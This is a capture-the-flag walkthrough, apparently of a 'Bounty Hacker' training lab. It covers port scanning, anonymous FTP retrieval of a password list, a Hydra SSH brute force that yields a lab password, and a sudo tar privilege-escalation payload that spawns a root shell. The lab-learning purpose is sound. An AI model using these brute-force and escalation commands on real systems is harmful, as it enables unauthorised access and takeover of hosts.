## Enumeration
```bash
┌──(jakespillers㉿kali)-[~/BountyHacker]
└─$ sudo nmap -sC -sV -T4 10.66.144.223   
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 17:57 -0500
Nmap scan report for 10.66.144.223
Host is up (0.034s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.209.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 47:f4:71:79:13:52:1f:3f:6c:5f:65:3b:44:f3:0a:69 (RSA)
|   256 7e:28:87:fc:62:bc:9d:b5:86:6a:9f:1e:04:3b:fe:59 (ECDSA)
|_  256 9b:90:99:57:34:36:27:ff:f2:a8:fc:5a:83:8f:e4:a3 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.43 seconds
```

## HTTP
![[Pasted image 20260307175959.png]]
- Nothing here for us.
## FTP
```bash
┌──(jakespillers㉿kali)-[~/BountyHacker]
└─$ lftp -u anonymous,anonymous 10.66.144.223
lftp anonymous@10.66.144.223:~> set ftp:passive-mode off
lftp anonymous@10.66.144.223:~> ls
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
lftp anonymous@10.66.144.223:/> get locks.txt
418 bytes transferred                              
lftp anonymous@10.66.144.223:/> get task.txt
68 bytes transferred                              
lftp anonymous@10.66.144.223:/> 
```

## locks.txt
```bash
┌──(jakespillers㉿kali)-[~/BountyHacker]
└─$ cat locks.txt                   
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e

```
- Potential passwords for a bruteforce via ssh. What is the username
## task.txt
```bash
┌──(jakespillers㉿kali)-[~/BountyHacker]
└─$ cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin

```
- Lets try lin

## Foothold
#### Hydra brute force
```bash
┌──(jakespillers㉿kali)-[~/BountyHacker]
└─$ hydra -l lin -P locks.txt ssh://10.66.144.223 -t 4 -V
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-07 18:05:37
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
[DATA] attacking ssh://10.66.144.223:22/
[ATTEMPT] target 10.66.144.223 - login "lin" - pass "rEddrAGON" - 1 of 26 [child 0] (0/0)
[ATTEMPT] target 10.66.144.223 - login "lin" - pass "ReDdr4g0nSynd!cat3" - 2 of 26 [child 1] (0/0)
[ATTEMPT] target 10.66.144.223 - login "lin" - pass "Dr@gOn$yn9icat3" - 3 of 26 [child 2] (0/0)
[ATTEMPT] target 10.66.144.223 - login "lin" - pass "R3DDr46ONSYndIC@Te" - 4 of 26 [child 3] (0/0)
[ATTEMPT] target 10.66.144.223 - login "lin" - pass "ReddRA60N" - 5 of 26 [child 0] (0/0)
[ATTEMPT] target 10.66.144.223 - login "lin" - pass "R3dDrag0nSynd1c4te" - 6 of 26 [child 1] (0/0)
[ATTEMPT] target 10.66.144.223 - login "lin" - pass "dRa6oN5YNDiCATE" - 7 of 26 [child 2] (0/0)
[ATTEMPT] target 10.66.144.223 - login "lin" - pass "ReDDR4g0n5ynDIc4te" - 8 of 26 [child 3] (0/0)
[ATTEMPT] target 10.66.144.223 - login "lin" - pass "R3Dr4gOn2044" - 9 of 26 [child 0] (0/0)
[ATTEMPT] target 10.66.144.223 - login "lin" - pass "RedDr4gonSynd1cat3" - 10 of 26 [child 1] (0/0)
[ATTEMPT] target 10.66.144.223 - login "lin" - pass "R3dDRaG0Nsynd1c@T3" - 11 of 26 [child 2] (0/0)
[ATTEMPT] target 10.66.144.223 - login "lin" - pass "Synd1c4teDr@g0n" - 12 of 26 [child 3] (0/0)
[22][ssh] host: 10.66.144.223   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-07 18:05:56

```
- Password: RedDr4gonSynd1cat3
#### SSH
```bash
ssh lin@10.66.144.223
# Password: RedDr4gonSynd1cat3
```

#### User flag
```bash
ls user.txt
```

## Privilege Escalation
```bash
lin@ip-10-66-144-223:~/Desktop$ sudo -l 
Matching Defaults entries for lin on ip-10-66-144-223: 
	env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
User lin may run the following commands on ip-10-66-144-223: 
	(root) /bin/tar
```
- Classic GTFOBins vector. `tar` can spawn a shell when run with the right flags.
#### The Payload
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
#### Verify
```bash
whoami 
# root
```

#### Root Flag
```bash
cat /root/root.txt
```
